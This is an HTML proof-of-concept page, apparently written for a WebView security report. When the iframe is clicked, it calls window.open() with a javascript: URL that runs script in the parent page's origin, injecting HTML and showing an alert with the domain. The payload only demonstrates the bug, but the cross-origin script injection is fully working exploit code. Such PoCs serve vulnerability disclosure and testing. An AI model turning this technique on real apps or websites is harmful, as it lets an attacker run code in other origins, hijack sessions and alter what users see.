
<!doctype html>
<html>
<head>
    <style>
        html {
            font-family: sans-serif;
        }
        h1 {
            font-size: 1.4em;
        }
    </style>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
<h1>iframe on <span id="originOutput"></span></h1>

<p>
    Tap/click this iframe, which will call window.open() with javascript: URL which executes in parent page context.
    (Observe injected HTML in parent page, and potentially an alert() dialog)
</p>

<p>Other events which result in user activations consumable by window.open() also work, such as focus events.</p>

<p>
    The alert() test is not reliable because if WebChromeClient.onJsAlert() is not defined or returns false, no alert
    dialog box will be shown
    despite PoC working. Other actions are more reliable, such as injecting HTML into parent page.
</p>

<script>
    document.getElementById('originOutput').innerText = window.location.origin;

  

        window.open('javascript:var elem = document.createElement("p");elem.innerHTML = "<b>Executed JS in parent origin: "+window.location.origin+"</b>"; document.body.append(elem);alert("XSS in doc.domain: "+document.domain+", win.origin: "+window.location.origin)');

        // window.open("javascript:alert('Executed JS in target '+window.location.origin)");

        // window.open("https://example.com");
</script>

</body>
</html>
